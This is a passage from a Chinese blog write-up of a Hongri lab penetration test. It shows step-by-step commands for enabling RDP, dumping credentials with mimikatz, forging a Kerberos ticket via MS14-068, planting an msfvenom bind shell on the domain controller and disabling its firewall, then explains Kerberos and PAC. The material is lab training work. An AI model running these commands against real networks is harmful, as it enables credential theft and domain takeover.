+<h3 id="3-3-3-看下远程桌面"><a href="#3-3-3-看下远程桌面" class="headerlink" title="3.3.3 看下远程桌面"></a>3.3.3 看下远程桌面</h3><p><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419200134839.png"><br>开启远程桌面<br><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br><code>proxychains rdesktop 192.168.183.2</code>        代理上远程<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419200319829.png"><br>啧啧，这个设置问题，一般是可以进去的<br>导致这个的原因：<br>客户端加入域后，域服务器重装系统，导致客户端的旧账户无法生效。<br>解决办法1：</p>
+<ol>
+<li>用本地管理员登陆到计算机</li>
+<li>打开计算机属性，在计算机名选项卡上点击”更改”，然后点击”其他”</li>
+<li>将”此计算机住DNS后缀”清空，注销后就可以登陆到域<br>解决办法2(暴力)：</li>
+<li>退域重启，再加入域<br>实战情况下，我们可以考虑其他办法：</li>
+<li>添加账户(推荐)</li>
+<li>使用现有账户，这里演示这种(一般选administrator，权限高，方便后续)<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419200742637.png"><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419200753589.png"><br>成功连接<br>当前登录的用户有两个<code>query user</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419200819908.png"></li>
+</ol>
+<h3 id="3-3-4-ms14-068攻击域控"><a href="#3-3-4-ms14-068攻击域控" class="headerlink" title="3.3.4 ms14-068攻击域控"></a>3.3.4 ms14-068攻击域控</h3><p>上传mimikatz 抓密码<br><code>mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; shash.txt</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419200936599.png"><br>可以看到用户的SID，或者通过MSF进程迁移执行<code>whoami/user</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419200951230.png"><br>现在有的信息：域用户的明文密码、SID值<br>目的：攻击域控<br>利用Kerberos域用户提权漏洞（MS14-068;CVE-2014-6324)来获得域控权限<br>MS14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址<br><code>MS14-068.exe -u douser@DEMO.COM -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130</code> 生成票据<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419201217440.png"><br>可以通过<code>mimikatz.exe &quot;kerberos::purge&quot; exit</code>  清除票据，再把票据注入到内存中<br><code>mimikatz.exe &quot;kerberos::ptc C:\Users\douser\Desktop\TGT_douser@demo.com.ccache&quot; exit</code><br>票据注入内存<br>查看是否成功<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419201317854.png"><br>OK，成功拿下，有cmd了 ，操作可就多了，开3389 加用户，改密码等等。。。<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419201406908.png"><br>为了方便管理，回弹shell到msf，生成一个正向木马，上传<br><code>msfvenom -p windows/meterpreter/bind_tcp LPORT=1444 -f exe -o /root/2.exe</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419201448851.png"><br><code>copy 2.exe \\WIN-ENS2VR5TR3N.demo.com\c$</code>上传到域控c盘<br>执行，但是正向连接不了<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419201528100.png"><br>思考一下什么问题呢，不用猜了，肯定是防护，看看防火墙状态(全关动静太大，可以加指定规则)<br><code>netsh firewall show state</code> 查看防火墙状态<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419201553845.png"></p>
+<ul>
+<li>直接关掉<code>netsh advfirewall set allprofiles state off</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419201617518.png"><br>这种情况，大多是木马不兼容的问题，重新生成一个<br><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1444 -f exe -o /root/2.exe</code><br>重复之前的操作，上传运行<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419201645206.png"><br>域控拿下<br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419201715566.png"></li>
+<li>开放指定端口规则的<br><code>netsh advfirewall firewall add rule name=&quot;Allow Port 1444 Inbound&quot; dir=in action=allow protocol=TCP localport=1444</code><br>验证是否添加成功<br><code>netsh advfirewall firewall show rule name=&quot;Allow Port 1444 Inbound&quot;</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419201823760.png"></li>
+</ul>
+<h2 id="3-4-三台主机全部拿下"><a href="#3-4-三台主机全部拿下" class="headerlink" title="3.4 三台主机全部拿下"></a>3.4 三台主机全部拿下</h2><p><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419201906494.png"></p>
+<h1 id="四、总结与扩展"><a href="#四、总结与扩展" class="headerlink" title="四、总结与扩展"></a>四、总结与扩展</h1><h2 id="4-1-攻击思路梳理"><a href="#4-1-攻击思路梳理" class="headerlink" title="4.1 攻击思路梳理"></a>4.1 攻击思路梳理</h2><ol>
+<li>通过探针不同的服务，扩大攻击面，利用不同的漏洞，通过不同的漏洞可以学习一下漏洞特征和工具的一些特征</li>
+<li>进入docker容器，没接触过，只能上网查，学习到逃逸的思路</li>
+<li>之前打点都是windows边界，这次是linux，也算是扩展一下思路，其实差不多(扩展探讨Linux上线CS)</li>
+<li>内网信息收集，代理隧道的搭建</li>
+<li>明确自己目的是啥，目前有的条件是啥(实验中有体现)</li>
+<li>利用ms14-068(域控没有打MS14-068的补丁(KB3011780))</li>
+</ol>
+<h2 id="4-2-工具链接"><a href="#4-2-工具链接" class="headerlink" title="4.2 工具链接"></a>4.2 工具链接</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">Ms14-068.exe 下载地址</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe">PSexec 下载地址</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">mimikatz 下载地址</a></li>
+</ol>
+<h2 id="4-3-Kerberos协议"><a href="#4-3-Kerberos协议" class="headerlink" title="4.3 Kerberos协议"></a>4.3 Kerberos协议</h2><p>参考理解：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/290907.html">Kerberos协议认证过程（理论篇） - FreeBuf网络安全行业门户</a></p>
+<h3 id="4-3-1-Kerberos认证流程"><a href="#4-3-1-Kerberos认证流程" class="headerlink" title="4.3.1 Kerberos认证流程"></a>4.3.1 Kerberos认证流程</h3><p><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419203656792.png"></p>
+<p>KDC（Key Distributed Centre）:密钥分发中心，由以下两部分组成</p>
+<ul>
+<li>AS（Authentication Server）:认证服务器，认证通过给你TGT</li>
+<li>TGS（Ticket Granting Server）:票证发放服务器,通过你的TGT来发放ST<br>TGT（Ticket Granting Ticket）：授予票证<br>ST（Service Ticket）：服务票据<br>Client：访问特定资源的客户<br>Server：拥有特定资源的主机</li>
+</ul>
+<p>krbtgt是KDC的账号，密码是随机生成的，无法登陆<br>（<strong>KDC存着所有用户的账号和密码</strong>）<br>可以使用以下语句查询<code>net user krbtgt</code><br><img src="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/image-20240419211333105.png"></p>
+<ul>
+<li><strong>Client与AS的交互</strong><br>双向认证，AS确认客户不是伪造的客户，客户确认AS不是伪造的AS<br>客户端把自己个人信息发给AS，AS验证客户ID是不是在自己的KDC数据库中<br>AS检查到客户端没问题，然后随机生成一个TGS-SessionKey<br>AS给客户端发送：</li>
+</ul>
+<ol>
+<li>用客户端的NTML HASH加密TGS-SessionKey之后发送给客户端</li>
+<li>AS将客户端个人信息（客户ID，需要访问的服务ID，IP地址，时间戳，存活时间和TGS-SessionKey）用TGS(krbtgt账户)的NTML HASH加密打包成一个TGT发给客户<br>客户端接收到之后，使用自身的NTML HASH解密得到TGS-SessionKey，但是无法解密TGT(没有krbtgt账户的NTML HASH)</li>
+</ol>
+<ul>
+<li><strong>Client与TGS的交互</strong><br>客户端将上面的TGT+TGS-SessionKey加密的Authenticator(包含了客户ID和时间戳)发送给TGS<br>TGS利用自己的NTML HASH解密TGT，得到TGS-SessionKey，再去解密Authenticator信息，然后比对一下Authenticator中的客户ID和TGT中的客户ID是否相等，比较来自 Authenticator 的时间戳和TGT的时间戳，检查TGT有没有过期，检查Authenticator是否已经在TGS的缓存中，验证通过后，TGS随机生成一个Key（包含了客户ID和时间戳），用于加密后续客户端和服务端的通信数据，这个key就是Service-SessionKey，将这个Service-SessionKey用TGS-SessionKey加密，以及将客户ID、服务ID、IP地址、时间戳、存活时间和TGS-SessionKey用服务的密钥加密打包成ST（服务票据），然后将这两个发给客户端</li>
+</ul>
+<p>客户端拿到ST，ST无法解密，因为解密他的密钥只有服务才有，客户端有TGS-SessionKey所以可以解密Service-SessionKey</p>
+<ul>
+<li><strong>Client与Service的交互</strong><br>客户将ST以及使用Service-SessionKey加密的个人信息Authenticator（包含客户ID和时间戳）发送给Service，然后Service利用自身密钥解密出ST，然后用ST中的Service-SessionKey去解密加密的Authenticator获取他的客户ID，然后比较两个ID是否相等，比较来自 Authenticator 的时间戳和来自ST的时间戳 ，检查 Authenticator 是否已经在对应服务的服务器的缓存中</li>
+</ul>
+<p>到此为止，所有的认证过程通过，客户端即可与远程服务完成了身份认证，可以进行后续的信息通信</p>
+<h3 id="4-3-2-PAC"><a href="#4-3-2-PAC" class="headerlink" title="4.3.2 PAC"></a>4.3.2 PAC</h3><p>PAC（Privilege Attribute Certificate，特权属性证书），是为了区分不同权限的客户。</p>
+<p>PAC包含两个数字签名PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM，以及客户的SID和客户所在的组，<br>第一个PAC_SERVER_CHECKSUM是由服务的NTLM HASH加密的<br>第二个PAC_PRIVSVR_CHECKSUM是KDC(krbtgt)的NTLM HASH加密的</p>
+<p>PAC在第一步过程中被放在TGT中，然后返回给客户端<br>在第二步过程中客户端发送自己的TGT给TGS，TGS会验证PAC（其实就是验证两个数字签名）是否被篡改，然后重新构造新的PAC放在ST中返回给客户<br>在第三步过程中将客户的ST发送给服务端，让服务端进行验证，服务端用自身密钥解密ST后，然后用ST中的Service-SessionKey去解密加密的Authenticator获取他的客户ID<br>然后比较两个ID是否相等，比较来自 Authenticator 的时间戳和ST的时间戳 (典型的 Kerberos 系统对差异的容忍度是 2 分钟，但也可以另行配置)，检查ST是否过期（根据ST里面的存活时间字段判断），检查 Authenticator 是否已经在对应服务的服务器的缓存中（不检查TGS缓存的话，那么如果TGS缓存中有Authenticator，会导致刷新TGS缓冲中的Authenticator，从而篡改客户ID和时间戳，导致重放攻击）<br>检查完毕后，服务为了判断客户是否有合法的权限，需要将客户的信息传递给KDC， KDC通过客户的信息判断客户所属的用户组信息， 用户权限等，然后KDC将结果返回给服务，服务利用结果（客户所属的用户组信息，用户权限等）与客户所索取的资源的ACL（Access Control List，权限控制列表，这个列表记录了哪个用户哪个用户组可以访问此资源）对比，判断客户是否有权限访问此资源。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://willsafe.github.io">willsafe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://willsafe.github.io/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/">http://willsafe.github.io/2024/04/19/红日靶场-4/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://willsafe.github.io" target="_blank">willsafeのBlog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="post_share"><div class="social-share" data-image="https://imgxz.bizhi3.com/cont/20220712/bokqceleh0u.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/04/10/java%E5%9F%BA%E7%A1%80/" title="java基础"><img class="cover" src="https://imgxz.bizhi3.com/cont/20220810/rea2pvlz2wf.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">java基础</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/03/04/CFS%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="CFS三层内网渗透"><img class="cover" src="https://cdn.pixabay.com/photo/2014/02/13/07/28/security-265130_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-04</div><div class="title">CFS三层内网渗透</div></div></a></div><div><a href="/2024/03/07/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/" title="红日靶场(1)"><img class="cover" src="https://www.bizhi3.com/uploads/ueditor/image/20220709/1657348971119782.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-07</div><div class="title">红日靶场(1)</div></div></a></div><div><a href="/2024/03/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-2/" title="红日靶场(2)"><img class="cover" src="https://imgxz.bizhi3.com/cont/20220810/5pj1tankwf0.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-19</div><div class="title">红日靶场(2)</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">willsafe</div><div class="author-info__description">如果你赶不上凌晨5点的日出,不妨看看傍晚6点的夕阳</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/willsafe"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/img/qq.png" target="_blank" title="QQ"><i class="iconfont icon-qq"></i></a><a class="social-icon" href="/img/wechat.png" target="_blank" title="微信"><i class="iconfont icon-weixin"></i></a><a class="social-icon" href="/img/github.png" target="_blank" title="Github"><i class="iconfont icon-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E6%8B%93%E6%89%91"><span class="toc-text">一、环境拓扑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%89%93%E7%82%B9"><span class="toc-text">二、打点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-text">2.1 主机探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">2.2 端口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E6%9C%8D%E5%8A%A1%E6%8E%A2%E9%92%88"><span class="toc-text">2.3 服务探针</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-1-struts2-2001%E7%AB%AF%E5%8F%A3"><span class="toc-text">2.3.1 struts2(2001端口)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-2-struts2%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-text">2.3.2 struts2流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-3-tomcat-2002%E7%AB%AF%E5%8F%A3"><span class="toc-text">2.3.3 tomcat(2002端口)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-4-phpmyadmin-2003%E7%AB%AF%E5%8F%A3"><span class="toc-text">2.3.4 phpmyadmin(2003端口)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-5-%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-text">2.3.5 蚁剑流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-6-%E5%93%A5%E6%96%AF%E6%8B%89php%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-text">2.3.6 哥斯拉php流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-7-%E5%86%B0%E8%9D%8E4-1%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-text">2.3.7 冰蝎4.1流量特征</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-docker%E9%80%83%E9%80%B8"><span class="toc-text">2.4 docker逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AE%B9%E5%99%A8"><span class="toc-text">2.4.1 判断是否容器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-2-docker%E9%80%83%E9%80%B8"><span class="toc-text">2.4.2 docker逃逸</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-text">三、内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">3.1 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-1-%E5%85%88%E6%8A%8Alinux%E5%8F%8D%E5%BC%B9%E5%88%B0msf%E4%B8%8A"><span class="toc-text">3.1.1 先把linux反弹到msf上</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-2-%E4%B8%8A%E4%BC%A0fscan%E6%89%AB"><span class="toc-text">3.1.2 上传fscan扫</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E6%B7%BB%E5%8A%A0frp%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93"><span class="toc-text">3.2 添加frp代理隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-msf%E6%B7%BB%E5%8A%A0%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86"><span class="toc-text">3.3 msf添加全局代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-1-%E6%94%BB%E5%87%BBwin7"><span class="toc-text">3.3.1 攻击win7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-2-%E5%9C%A8win7%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-text">3.3.2 在win7收集信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-3-%E7%9C%8B%E4%B8%8B%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-text">3.3.3 看下远程桌面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-4-ms14-068%E6%94%BB%E5%87%BB%E5%9F%9F%E6%8E%A7"><span class="toc-text">3.3.4 ms14-068攻击域控</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-%E4%B8%89%E5%8F%B0%E4%B8%BB%E6%9C%BA%E5%85%A8%E9%83%A8%E6%8B%BF%E4%B8%8B"><span class="toc-text">3.4 三台主机全部拿下</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93%E4%B8%8E%E6%89%A9%E5%B1%95"><span class="toc-text">四、总结与扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF%E6%A2%B3%E7%90%86"><span class="toc-text">4.1 攻击思路梳理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E5%B7%A5%E5%85%B7%E9%93%BE%E6%8E%A5"><span class="toc-text">4.2 工具链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-Kerberos%E5%8D%8F%E8%AE%AE"><span class="toc-text">4.3 Kerberos协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-1-Kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-text">4.3.1 Kerberos认证流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-2-PAC"><span class="toc-text">4.3.2 PAC</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/" title="红日靶场(4)"><img src="https://imgxz.bizhi3.com/cont/20220712/bokqceleh0u.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场(4)"/></a><div class="content"><a class="title" href="/2024/04/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-4/" title="红日靶场(4)">红日靶场(4)</a><time datetime="2024-04-19T07:46:38.000Z" title="发表于 2024-04-19 15:46:38">2024-04-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/10/java%E5%9F%BA%E7%A1%80/" title="java基础"><img src="https://imgxz.bizhi3.com/cont/20220810/rea2pvlz2wf.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java基础"/></a><div class="content"><a class="title" href="/2024/04/10/java%E5%9F%BA%E7%A1%80/" title="java基础">java基础</a><time datetime="2024-04-10T11:17:23.000Z" title="发表于 2024-04-10 19:17:23">2024-04-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/03/shrio%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="shrio漏洞利用"><img src="https://pic.mksucai.com/00/42/22/48d3c6ee389a0d31.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="shrio漏洞利用"/></a><div class="content"><a class="title" href="/2024/04/03/shrio%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="shrio漏洞利用">shrio漏洞利用</a><time datetime="2024-04-03T09:47:29.000Z" title="发表于 2024-04-03 17:47:29">2024-04-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/02/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="redis漏洞利用"><img src="https://imgxz.bizhi3.com/cont/20220811/4pmy0eqdicr.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="redis漏洞利用"/></a><div class="content"><a class="title" href="/2024/04/02/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="redis漏洞利用">redis漏洞利用</a><time datetime="2024-04-02T08:48:26.000Z" title="发表于 2024-04-02 16:48:26">2024-04-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-2/" title="红日靶场(2)"><img src="https://imgxz.bizhi3.com/cont/20220810/5pj1tankwf0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场(2)"/></a><div class="content"><a class="title" href="/2024/03/19/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-2/" title="红日靶场(2)">红日靶场(2)</a><time datetime="2024-03-19T02:23:26.000Z" title="发表于 2024-03-19 10:23:26">2024-03-19</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://imgxz.bizhi3.com/cont/20221213/4byfdiqvs4i.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024  <i id="heartbeat" class="fa fas fa-heartbeat"></i> willsafe</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">I wish you to become your own sun, no need to rely on who's light.<p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="2771052201" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-lrctype="1" data-preload="none" data-autoplay="true" muted></div><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script data-pjax defer src="https://npm.elemecdn.com/tzy-blog/lib/js/theme/chocolate.js"></script><script id="canvas_nest" defer="defer" color="67,233,186" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let 